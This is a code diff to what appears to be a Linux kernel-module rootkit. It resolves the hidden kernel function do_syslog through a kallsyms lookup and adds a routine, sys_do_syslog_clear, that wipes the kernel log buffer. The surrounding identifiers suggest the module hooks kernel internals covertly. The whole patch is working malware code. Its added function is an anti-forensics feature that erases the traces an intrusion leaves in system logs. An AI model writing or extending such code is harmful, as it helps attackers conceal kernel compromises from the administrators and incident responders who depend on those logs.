@@ -18,6 +18,7 @@
 #include <linux/percpu.h>
 #include <linux/inet_diag.h>
 #include <linux/netlink.h>
+#include <linux/syslog.h>
 
 #include "lkm.h"
 #include "fs.h"
@@ -1173,6 +1174,11 @@ struct kernel_syscalls *kv_kall_load_addr(void)
 			"__bpf_map_get");
 #endif
 
+		ks.k_do_syslog =
+			(do_syslog_sg)ks.k_kallsyms_lookup_name("do_syslog");
+		if (!ks.k_do_syslog)
+			prwarn("invalid data: do_syslog will not work\n");
+
 		if (!ks.k_bpf_map_get)
 			prwarn("invalid data: bpf_map_get will not work\n");
 
@@ -1333,6 +1339,14 @@ static bool _sys_file_init(void)
 	}
 
 	return rc;
+}
+
+void sys_do_syslog_clear(void)
+{
+	struct kernel_syscalls *ks = kv_kall_load_addr();
+	if (ks && ks->k_do_syslog) {
+		ks->k_do_syslog(SYSLOG_ACTION_CLEAR, NULL, 0, SYSLOG_FROM_PROC);
+	}
 }
 
 char *sys_get_ttyfile(void)
